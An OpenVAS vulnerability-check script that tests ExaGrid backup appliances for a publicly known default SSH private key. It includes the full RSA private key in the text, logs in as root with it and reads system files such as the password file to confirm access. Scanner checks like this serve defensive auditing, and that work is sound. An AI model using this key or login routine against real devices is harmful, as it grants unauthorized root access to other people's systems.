###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ExaGrid_default_ssh_login.nasl 12149 2018-10-29 10:48:30Z asteins $
#
# Exagrid SSH Known SSH Private Key
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105597");
  script_version("$Revision: 12149 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Exagrid SSH Known SSH Private Key");
  script_tag(name:"last_modification", value:"$Date: 2018-10-29 11:48:30 +0100 (Mon, 29 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-04-07 17:30:40 +0200 (Thu, 07 Apr 2016)");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_require_ports("Services/ssh", 22);

  script_tag(name:"summary", value:'The remote Exagrid device is prone to a default account authentication bypass vulnerability.');

  script_tag(name:"impact", value:'This issue may be exploited by a remote attacker to gain access to sensitive information or modify system configuration.');

  script_tag(name:"vuldetect", value:'Try to login with known private key.');
  script_tag(name:"solution", value:'Delete the known key.');
  script_tag(name:"solution_type", value:"Mitigation");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_keys("Host/runs_unixoide");
  script_tag(name:"qod_type", value:"exploit");
  exit(0);
}

include("ssh_func.inc");
include("misc_func.inc");

port = get_kb_item( "Services/ssh" );
if( ! port ) port = 22;

if( ! get_port_state( port ) ) exit( 0 );

if( ! soc = open_sock_tcp( port ) ) exit( 0 );

user = 'root';
key = '-----BEGIN RSA PRIVATE KEY-----
MIICWAIBAAKBgGdlD7qeGU9f8mdfmLmFemWMnz1tKeeuxKznWFI+6gkaagqjAF10
hIruzXQAik7TEBYZyvw9SvYU6MQFsMeqVHGhcXQ5yaz3G/eqX0RhRDn5T4zoHKZa
E1MU86zqAUdSXwHDe3pz5JEoGl9EUHTLMGP13T3eBJ19MAWjP7Iuji9HAgElAoGA
GSZrnBieX2pdjsQ55/AJA/HF3oJWTRysYWi0nmJUmm41eDV8oRxXl2qFAIqCgeBQ
BWA4SzGA77/ll3cBfKzkG1Q3OiVG/YJPOYLp7127zh337hhHZyzTiSjMPFVcanrg
AciYw3X0z2GP9ymWGOnIbOsucdhnbHPuSORASPOUOn0CQQC07Acq53rf3iQIkJ9Y
iYZd6xnZeZugaX51gQzKgN1QJ1y2sfTfLV6AwsPnieo7+vw2yk+Hl1i5uG9+XkTs
Ry45AkEAkk0MPL5YxqLKwH6wh2FHytr1jmENOkQu97k2TsuX0CzzDQApIY/eFkCj
QAgkI282MRsaTosxkYeG7ErsA5BJfwJAMOXYbHXp26PSYy4BjYzz4ggwf/dafmGz
ebQs+HXa8xGOreroPFFzfL8Eg8Ro0fDOi1lF7Ut/w330nrGxw1GCHQJAYtodBnLG
XLMvDHFG2AN1spPyBkGTUOH2OK2TZawoTmOPd3ymK28LriuskwxrceNb96qHZYCk
86DC8q8p2OTzYwJANXzRM0SGTqSDMnnid7PGlivaQqfpPOx8MiFR/cGr2dT1HD7y
x6f/85mMeTqamSxjTJqALHeKPYWyzeSnUrp+Eg==
-----END RSA PRIVATE KEY-----';

login = ssh_login( socket:soc, login:user, password:NULL, pub:NULL, priv:key, passphrase:NULL );

if(login == 0)
{
  files = traversal_files("linux");

  foreach pattern( keys( files ) ) {

    file = files[pattern];

    cmd = ssh_cmd( socket:soc, cmd:'cat /' + file );
    close( soc );

    if( egrep( string:cmd, pattern:pattern ) )
    {
      report = 'It was possible to login as user `root` with the known secret key and to execute `cat /' + file + '`. Result:\n\n' + cmd;
      close( soc );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

if( soc ) close( soc );
exit( 99 );
